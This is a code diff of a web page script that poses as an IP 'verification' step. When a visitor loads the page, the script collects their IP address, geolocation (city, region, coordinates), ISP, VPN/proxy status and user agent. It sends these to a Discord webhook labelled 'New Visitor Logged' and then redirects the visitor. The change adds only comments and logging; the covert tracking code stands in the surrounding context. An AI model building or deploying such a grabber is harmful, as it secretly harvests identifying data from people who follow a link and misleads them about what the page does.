@@ -45,25 +45,30 @@
             document.getElementById('verify').innerHTML = `<h1>Verifying your IP...</h1><p class="loading">Please wait while we validate your connection...</p>`;
 
             try {
-                // Fetch the user's IP address from ipify
+                // Step 1: Get IP Address
+                console.log("Fetching IP address...");
                 const ipResponse = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
+                console.log("IP Address:", userIP);
 
-                // Fetch location data from ip-api.com
+                // Step 2: Get Location Data
+                console.log("Fetching location data...");
                 const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
                 const locationData = await locationResponse.json();
 
+                // Check if location data was successfully fetched
                 if (locationData.status !== "success") {
                     console.error("Error getting location data:", locationData.message);
-                    window.location.href = redirectURL; // Redirect even if there's an error
+                    window.location.href = redirectURL; // Redirect if there's an error
                     return;
                 }
+                console.log("Location Data:", locationData);
 
-                // Determine VPN status
+                // Step 3: Check VPN/Proxy status
                 const vpnStatus = locationData.proxy || locationData.hosting ? "🔴 **VPN/Proxy Detected**" : "🟢 **No VPN/Proxy Detected**";
 
-                // Create the message to send to Discord
+                // Step 4: Prepare message for Discord webhook
                 const userAgent = navigator.userAgent;
                 const message = {
                     content: `**New Visitor Logged**\n\n` +
@@ -84,7 +89,8 @@
                              `**User-Agent:** \`${userAgent}\``
                 };
 
-                // Send data to Discord webhook
+                // Step 5: Send data to Discord webhook
+                console.log("Sending data to Discord...");
                 const discordResponse = await fetch(webhookURL, {
                     method: "POST",
                     headers: {
@@ -97,8 +103,9 @@
                     console.error("Error sending message to Discord:", discordResponse.statusText);
                 }
 
-                // Add a small delay before redirecting to ensure data is sent
+                // Step 6: Redirect after sending data
                 setTimeout(() => {
+                    console.log("Redirecting to URL...");
                     window.location.href = redirectURL;
                 }, 1000); // 1 second delay before redirecting
 
